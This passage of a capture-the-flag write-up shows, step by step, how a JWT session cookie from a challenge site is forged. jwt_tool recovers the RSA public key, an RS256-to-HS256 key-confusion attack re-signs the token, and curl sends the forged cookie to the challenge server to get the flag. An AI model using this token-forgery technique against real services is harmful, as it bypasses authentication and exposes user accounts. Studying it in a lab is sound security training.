...
set-cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.[AWS_SECRET_REMOVED]NzM4MTIwfQ.To_hskfiK0mZ0lGDQhi_rFhpUzazdv5OfMjeKE6eqj2k0N-QNoueR4jqvGdGvt6Kei42XqDZo1iTwxKDq8ikvw; Path=/
```

This looks like a JWT token:

```
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# python3 ~/utils/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.[AWS_SECRET_REMOVED]NzM4MTIwfQ.To_hskfiK0mZ0lGDQhi_rFhpUzazdv5OfMjeKE6eqj2k0N-QNoueR4jqvGdGvt6Kei42XqDZo1iTwxKDq8ikvw
...
writing RSA key
-----BEGIN PUBLIC KEY-----
[AWS_SECRET_REMOVED]JuO8wMVhKhWptHb42BwYH533
[AWS_SECRET_REMOVED]3GXqduDdzFU85wIDAQAB
-----END PUBLIC KEY-----
```
...
```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# python3 ~/utils/jwt_tool/jwt_tool.py -X k -pk public.pem eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.[AWS_SECRET_REMOVED]NzM4MTIwfQ.To_hskfiK0mZ0lGDQ
...
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]NzM4MTIwfQ.z3ICauMOuuIxO_0WJtBPfdqevXBXqihSIAMSL6w2Ej4
```
...
```console
root@kali:/media/sf_CTFs/appsec/Mr.Voorhees# curl -s https://mr-voorhees.appsecil.ctf.today/ -H "Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.[AWS_SECRET_REMOVED]NzM4MTIwfQ.z3ICauMOuuIxO_0WJtBPfdqevXBXqihSIAMSL6w2Ej4" | grep AppSec
